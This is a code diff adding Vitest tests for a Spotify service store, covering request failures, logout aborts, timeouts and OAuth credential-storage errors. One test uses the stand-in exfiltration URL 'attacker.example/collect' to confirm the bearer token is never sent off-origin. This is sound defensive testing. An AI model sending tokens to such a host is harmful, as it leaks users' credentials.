@@ -1,4 +1,4 @@
-import { describe, it, expect, beforeEach, vi } from "vitest";
+import { describe, it, expect, beforeEach, afterEach, vi } from "vitest";
 
 // zustand persist(useSettingsStore)용 최소 localStorage 폴리필 (node 환경)
 if (typeof globalThis.localStorage === "undefined") {
@@ -17,7 +17,12 @@ const { invoke, openUrl } = vi.hoisted(() => ({ invoke: vi.fn(), openUrl: vi.fn(
 vi.mock("@tauri-apps/api/core", () => ({ invoke: (...args: unknown[]) => invoke(...args) }));
 vi.mock("@tauri-apps/plugin-opener", () => ({ openUrl: (...args: unknown[]) => openUrl(...args) }));
 
-import { useServiceStore } from "./useServiceStore";
+import { spotifyApiRequest, useServiceStore } from "./useServiceStore";
+
+afterEach(() => {
+  vi.useRealTimers();
+  vi.unstubAllGlobals();
+});
 
 const reset = () =>
   useServiceStore.setState({
@@ -228,6 +233,61 @@ describe("useServiceStore — Spotify repeat ownership", () => {
   });
 });
 
+describe("Spotify API request failures", () => {
+  beforeEach(() => {
+    reset();
+    useServiceStore.setState({ isLoggedIn: true, accessToken: "token", tokenExpiresAt: Date.now() + 3600000 });
+  });
+
+  it("does not report an HTTP error as an empty device list", async () => {
+    vi.stubGlobal("fetch", vi.fn().mockResolvedValue({ ok: false, status: 403 }));
+    await expect(useServiceStore.getState().fetchDevices()).rejects.toThrow("403");
+  });
+
+  it("never sends the Spotify bearer token to a non-Spotify origin", async () => {
+    const fetchMock = vi.fn();
+    vi.stubGlobal("fetch", fetchMock);
+
+    await expect(spotifyApiRequest("https://attacker.example/collect", {}, async () => undefined))
+      .rejects.toThrow("invalid_spotify_origin");
+    expect(fetchMock).not.toHaveBeenCalled();
+  });
+
+  it("aborts a Spotify API request when the session logs out", async () => {
+    let observedSignal: AbortSignal | undefined;
+    vi.stubGlobal("fetch", vi.fn((_url: RequestInfo | URL, init?: RequestInit) => {
+      observedSignal = init?.signal as AbortSignal;
+      return new Promise<Response>((_resolve, reject) => {
+        observedSignal?.addEventListener("abort", () => reject(new DOMException("Aborted", "AbortError")), { once: true });
+      });
+    }));
+
+    const pending = useServiceStore.getState().transferToDevice("device", false);
+    await vi.waitFor(() => expect(observedSignal).toBeDefined());
+    useServiceStore.getState().logout();
+
+    await expect(pending).rejects.toThrow();
+    expect(observedSignal?.aborted).toBe(true);
+  });
+
+  it("times out a stalled Spotify API request", async () => {
+    vi.useFakeTimers();
+    let observedSignal: AbortSignal | undefined;
+    vi.stubGlobal("fetch", vi.fn((_url: RequestInfo | URL, init?: RequestInit) => {
+      observedSignal = init?.signal as AbortSignal;
+      return new Promise<Response>((_resolve, reject) => {
+        observedSignal?.addEventListener("abort", () => reject(new DOMException("Aborted", "AbortError")), { once: true });
+      });
+    }));
+
+    const pending = useServiceStore.getState().fetchDevices();
+    const outcome = expect(pending).rejects.toThrow("timeout");
+    await vi.advanceTimersByTimeAsync(15_000);
+    await outcome;
+    expect(observedSignal?.aborted).toBe(true);
+  });
+});
+
 describe("OAuth listener security", () => {
   beforeEach(() => { reset(); invoke.mockReset(); invoke.mockResolvedValue(undefined); });
   it("passes the pending random state to the native listener", async () => {
@@ -371,5 +431,32 @@ describe("auth generation ownership", () => {
     expect(useServiceStore.getState()._authGeneration).toBeGreaterThan(before);
     expect(useServiceStore.getState().isLoggedIn).toBe(false);
     expect(useServiceStore.getState().accessToken).toBeNull();
+  });
+
+  it("does not mark OAuth login complete when the refresh token cannot be stored", async () => {
+    useServiceStore.setState({ _pendingCodeVerifier: "verifier", _pendingOAuthState: "state" });
+    invoke.mockImplementation((command: string) => command === "exchange_spotify_token"
+      ? Promise.resolve({ accessToken: "access", refreshToken: "refresh", expiresIn: 3600 })
+      : command === "save_refresh_token"
+        ? Promise.reject(new Error("credential store failed"))
+        : Promise.resolve(undefined));
+
+    await expect(useServiceStore.getState().handleCallback("http://localhost/callback?code=c&state=state"))
+      .rejects.toThrow("credential store failed");
+    expect(useServiceStore.getState().isLoggedIn).toBe(false);
+    expect(useServiceStore.getState().accessToken).toBeNull();
+  });
+
+  it("reports when logout cannot remove persisted credentials", async () => {
+    const { useToastStore } = await import("../stores/useToastStore");
+    const { useI18nStore } = await import("./useI18nStore");
+    useToastStore.setState({ toasts: [] });
+    invoke.mockImplementation((command: string) => command === "clear_refresh_token"
+      ? Promise.reject(new Error("credential store failed"))
+      : Promise.resolve(undefined));
+
+    useServiceStore.getState().logout();
+    await vi.waitFor(() => expect(useToastStore.getState().toasts).toHaveLength(1));
+    expect(useToastStore.getState().toasts[0]?.message).toBe(useI18nStore.getState().t.toast.spotifyTokenCleanupFailed);
   });
 });
